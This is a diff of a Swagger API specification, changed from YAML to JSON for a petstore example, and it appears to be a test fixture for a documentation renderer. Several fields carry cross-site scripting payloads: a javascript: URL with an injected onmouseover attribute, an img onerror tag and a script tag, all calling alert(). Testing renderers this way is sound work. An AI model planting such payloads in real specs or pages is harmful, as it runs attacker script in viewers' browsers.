@@ -1,15 +1,57 @@
-swagger: '2.0'
-info:
-  title: Example yaml.spec
-  description: This is Description
-  url: 'javascript:alert(document.domain)'" onmouseover="javascript:alert(1)"
-paths:
-  /accounts:
-    get:
-      responses:
-        '200':
-          description: No response was specified
-      tags:
-        - accounts
-      operationId: findAccounts
-      summary: Finds all accounts
+{
+  "swagger": "2.0",
+  "info": {
+    "version": "1.0.0",
+    "title": "Swagger Petstore",
+    "contact":{ 
+    "name": "API Support",
+    "url": "javascript:alert(document.domain)" onmouseover="javascript:alert(1)"
+    }
+  },
+  "paths": {
+    "/pets": {
+      "get": {
+        "description": "This is Description </p><img/src/onerror='javascript:alert(document.domain)//'><p>ok",
+        "operationId": "findPets",
+        "produces": [
+          "application/json",
+          "application/xml",
+          "text/xml",
+          "text/html"
+        ],
+        "parameters": [
+          {
+            "name": "tags",
+            "in": "query",
+            "description": "Hello<script>alert()</script>",
+            "required": false,
+            "type": "array",
+            "items": {
+              "type": "string"
+            },
+            "collectionFormat": "csv"
+          },
+          {
+            "name": "limit",
+            "in": "query",
+            "description": "maximum number of results to return",
+            "required": false,
+            "type": "integer",
+            "format": "int32"
+          }
+        ],
+        "responses": {
+          "200": {
+            "description": "pet response",
+            "schema": {
+              "type": "string"
+            }
+          },
+          "default": {
+            "description": "unexpected error"
+          }
+        }
+      }
+    }
+  }
+  }
